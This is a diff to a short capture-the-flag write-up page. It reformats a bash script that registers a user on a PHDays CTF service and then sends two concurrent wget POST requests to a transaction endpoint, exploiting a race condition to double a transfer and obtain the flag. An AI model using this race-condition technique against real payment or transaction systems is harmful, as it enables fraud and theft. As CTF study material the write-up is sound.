@@ -10,17 +10,32 @@ categories:
 </head>
 <body>
 <h1>race condition</h1>
-<pre><code class="bash">
+<pre><code>
+#!bash
 #!/bin/bash
 pass="epta"
 username="lolbobbobbob"
 hash="40433343a063d26054a3169b42b5957f"
+
 #register user
-wget "http://ctf.phdays.com:1629/?act=register" --post-data="login=$username&pass1=$pass&pass2=$pass&email=alter@lobotomy.me" --save-cookies=cookiejar --keep-session-cookies  --load-cookies=cookiejar -O /dev/null -q
+wget "http://ctf.phdays.com:1629/?act=register" \
+    --post-data="login=$username&pass1=$pass&pass2=$pass&email=alter@lobotomy.me" \
+    --save-cookies=cookiejar --keep-session-cookies  \
+    --load-cookies=cookiejar -O /dev/null -q
+
 sleep 1
-#race condition
-    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=$hash&amount=1000" --load-cookies=cookiejar --save-cookies=cookiejar --keep-session-cookies -O $hash.html -q&
-    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=$hash&amount=1000" --load-cookies=cookiejar --save-cookies=cookiejar --keep-session-cookies -O s_$hash.html -q
+
+#race condition 1/2
+wget "http://ctf.phdays.com:1629/?act=transaction" \
+    --post-data="account=$hash&amount=1000" \
+    --load-cookies=cookiejar --save-cookies=cookiejar \
+    --keep-session-cookies -O $hash.html -q&
+
+#race condition 2/2
+wget "http://ctf.phdays.com:1629/?act=transaction" \
+    --post-data="account=$hash&amount=1000" \
+    --load-cookies=cookiejar --save-cookies=cookiejar \
+    --keep-session-cookies -O s_$hash.html -q
 </code></pre>
 <br>
 Login as user $username and get your flag.
